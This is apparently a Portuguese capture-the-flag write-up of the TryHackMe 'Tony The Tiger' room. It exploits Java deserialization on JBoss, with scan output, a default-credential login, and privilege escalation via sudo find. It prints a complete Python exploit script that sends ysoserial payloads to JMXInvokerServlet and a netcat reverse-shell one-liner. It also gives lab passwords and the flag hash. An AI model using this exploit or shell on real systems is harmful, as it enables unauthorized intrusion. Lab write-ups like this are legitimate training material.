# THM - Tony The Tiger

![2025-11-29_19-38.png](THM%20-%20Tony%20The%20Tiger/3ff4d8e4-776a-4704-9206-01e63fa9ee84.png)

---

Hoje vamos explorar uma máquina com um conteúdo bem específico, no caso uma falha, que seria Java Deserialization. Muitos não devem conhecer por ser uma falha bem underground e fora do OWASP Top Ten. Essa falha é um tanto complexa, mas nada muito difícil de entender. Vou dar um breve resumo.

em aplicações OOP (orientadas a objetos) trabalhamos com objetos, mas nisso existe um processo chamado serialização, que é quando o Java transforma o grafo de objetos em um stream binário (“object stream”). No processo, ele passa pela rede e é desserializado. O probleminha nisso está quando a entrada externa é desserializada sem validação. O que vamos explorar são os gadgets que terminam por executar esse objeto assim que desserializado. Nós, como atacantes, vamos manipular esse processo de desconstrução e construção e enviar um objeto malicioso no lugar do objeto legítimo, fazendo ele passar pelo processo de byte stream e ser executado no processo pelos gadgets.

NMAP: 

```jsx
➜  ~ nmap 10.64.148.239 -T4 -sV -Pn

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 17:28 EST
Nmap scan report for 10.64.148.239
Host is up (0.14s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
1090/tcp open  java-rmi    Java RMI
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8083/tcp open  http        JBoss service httpd
```

Fuzzing de diretorios com feroxbuster na porta 80

```jsx
➜  ~ feroxbuster -u http://10.64.148.239:80

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.64.148.239/
 🚩  In-Scope Url          │ 10.64.148.239
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
301      GET        9l       28w      310c http://10.64.148.239/js => http://10.64.148.239/js/
301      GET        9l       28w      314c http://10.64.148.239/images => http://10.64.148.239/images/
301      GET        9l       28w      311c http://10.64.148.239/css => http://10.64.148.239/css/
200      GET        1l      210w    11920c http://10.64.148.239/css/style.css
301      GET        9l       28w      312c http://10.64.148.239/page => http://10.64.148.239/page/
200      GET      173l     1591w    16608c http://10.64.148.239/index.html
301      GET        9l       28w      312c http://10.64.148.239/tags => http://10.64.148.239/tags/
200      GET       25l     1746w   143694c http://10.64.148.239/js/bundle.js
200      GET      173l     1591w    16608c http://10.64.148.239/
301      GET        9l       28w      313c http://10.64.148.239/fonts => http://10.64.148.239/fonts/
301      GET        9l       28w      328c http://10.64.148.239/posts/frosted-flakes => http://10.64.148.239/posts/frosted-flakes/
301      GET        9l       28w      318c http://10.64.148.239/posts/page => http://10.64.148.239/posts/page/
301      GET        9l       28w      314c http://10.64.148.239/page/1 => http://10.64.148.239/page/1/
301      GET        9l       28w      327c http://10.64.148.239/posts/my-first-post => http://10.64.148.239/posts/my-first-post/
200      GET      176l     1592w    16594c http://10.64.148.239/posts/
200      GET     1428l     4919w   355092c http://10.64.148.239/fonts/OpenSans-Regular.ttf
200      GET     1822l    10973w   911237c http://10.64.148.239/images/default.jpg
301      GET        9l       28w      320c http://10.64.148.239/posts/page/1 => http://10.64.148.239/posts/page/1/
301      GET        9l       28w      318c http://10.64.148.239/categories => http://10.64.148.239/categories/
301      GET        9l       28w      313c http://10.64.148.239/posts => http://10.64.148.239/posts/
```

Após enumerar as portas, dei uma olhada na aplicação na porta 8080 e tentei logar no admin console usando credenciais comuns padrão, como admin/admin.

![dss.png](THM%20-%20Tony%20The%20Tiger/dss.png)

![dsss.png](THM%20-%20Tony%20The%20Tiger/dsss.png)

E boom, realmente as creds eram admin/admin…

![2025-11-29_17-41.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_17-41.png)

Dei uma leve olhada, mas nada para me manter ali, então decidi voltar ao objetivo e responder as perguntas do THM.

![deserialize.png](THM%20-%20Tony%20The%20Tiger/deserialize.png)

![2025-11-29_19-07.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_19-07.png)

Na task 4 tivemos a primeira flag. então olhei os posts na site na porta 80 , decidi olhar internamente nas imagens. Ao olhar as strings da imagem presente em um dos posts, eu achei a flag requisitada.3

![2025-11-29_18-30_1.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_18-30_1.png)

![2025-11-29_18-30.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_18-30.png)

![2025-11-29_19-07_1.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_19-07_1.png)

Logo parti para a task 5, onde vamos realmente começar a explorar a falha principal da máquina, no caso o deserialization.

![2025-11-29_19-07_2.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_19-07_2.png)

Bom, dependendo da sua máquina, você pode ter alguns problemas com esse exploit e com o ysoserial devido à chatice que são as versões do Java. Como não temos o Java 8 no repositório do Debian/Kali, eu trouxe aqui um meio de fazer a instalação sem muita dor de cabeça.

instalndo o java 8 

```jsx
➜  ~ curl -s "https://get.sdkman.io" | bash
source "$HOME/.sdkman/bin/sdkman-init.sh"

➜  ~ sdk install java 8.0.382-tem

```

Em seguida temos o exploit, que é para Python 2/2.7, então aqui está uma versão atualizada para Python 3:

```jsx
#!/usr/bin/env python3

import requests
import subprocess
import argparse
import sys
import os
from subprocess import check_output, CalledProcessError

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

ysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']
ysoserial_path = None

parser = argparse.ArgumentParser(
    description="JBoss Java Deserialization (LAB) — Python3 version"
)

parser.add_argument('target', type=str, help='Target in the format IP:PORT')
parser.add_argument('command', type=str, help='Command to execute')
parser.add_argument('--proto', choices={'http', 'https'}, default='http',
                    help='Protocol to use (default: http)')
parser.add_argument('--ysoserial-path', metavar='PATH', type=str,
                    help='Path to ysoserial.jar')
parser.add_argument('--gadget', type=str, default='CommonsCollections5',
                    help='Gadget to use (default: CommonsCollections5)')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if not args.ysoserial_path:
    for path in ysoserial_default_paths:
        if os.path.exists(path):
            ysoserial_path = path
else:
    if os.path.exists(args.ysoserial_path):
        ysoserial_path = args.ysoserial_path

if ysoserial_path is None:
    print("[-] Could not find ysoserial.jar")
    sys.exit(1)

if ":" not in args.target:
    print("[-] Target must be in format IP:PORT")
    sys.exit(1)

ip, port = args.target.split(":")

print(f"[*] Target IP: {ip}")
print(f"[*] Target PORT: {port}")
print(f"[*] Using gadget: {args.gadget}")
print(f"[*] Using ysoserial: {ysoserial_path}")

try:
    gadget_payload = check_output(
        ['java', '-jar', ysoserial_path, args.gadget, args.command],
        stderr=subprocess.STDOUT
    )
except CalledProcessError as e:
    print("[-] Error while generating payload:")
    print(e.output.decode(errors='ignore'))
    sys.exit(1)

url = f"{args.proto}://{ip}:{port}/invoker/JMXInvokerServlet"
print(f"[*] Sending payload to: {url}")

try:
    r = requests.post(url, data=gadget_payload, verify=False)
except Exception as e:
    print(f"[-] Request error: {e}")
    sys.exit(1)

print(f"[*] HTTP Status: {r.status_code}")

if r.status_code == 200:
    print("[+] Payload delivered (server responded 200)")
else:
    print("[-] Unexpected response")
```

Pessoalmente, para mim esse exploit não funcionou, então decidi mudar para outro. No caso, utilizei o https://github.com/joaomatosf/jexboss Sem muito segredo, foi bem rápido

![2025-11-29_21-18.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_21-18.png)

gotchaaa, Peguei shell, mas não gostei tanto dessa shell gerada pelo exploit, então mudei para uma melhorzinha.

![2025-11-29_21-21.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_21-21.png)

Shell que migrei:

```jsx
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.143.4 1337 >/tmp/f

```

Logo o que fiz foi ir para o diretório /home, curiar o que tinha dentro dos perfis de usuários, e dentro do usuário jboss encontrei esse txt que nos dava sua senha:

```jsx
Password: likeaboss
```

![2025-11-29_21-26.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_21-26.png)

Logo melhorei minha shell para conseguir rodar o comando su, e em seguida já loguei e dei um sudo -l, que me mostrou o find. Não perdi tempo e parti para tentar escalar para root por SUID.

![2025-11-29_21-50.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_21-50.png)

Com root já fui para /root ler a flag e me deparei com ela em base64.

![2025-11-29_21-58.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_21-58.png)

Decidi então decodá-la no CyberChef e consegui ela hasheada em md5:

![2025-11-29_22-00.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_22-00.png)

```jsx
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==  >> BC77AC072EE30E3760806864E234C7CF 
```

usei então para quebrar essa hash o hashcat, usando a dica da room nessa parte para usarmos a rockyou:

```jsx
➜  ~ hashcat -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt
```

![2025-11-29_22-02.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_22-02.png)

Com isso, o resultado é nossa flag para root, mas devido ao meu rush para pegar root acabei deixando a outra flag do user jboss passar. Vamos voltar e pegar ela.

![2025-11-29_22-02_1.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_22-02_1.png)

![2025-11-29_22-03.png](THM%20-%20Tony%20The%20Tiger/2025-11-29_22-03.png)

Easy piece, e aqui terminamos essa room.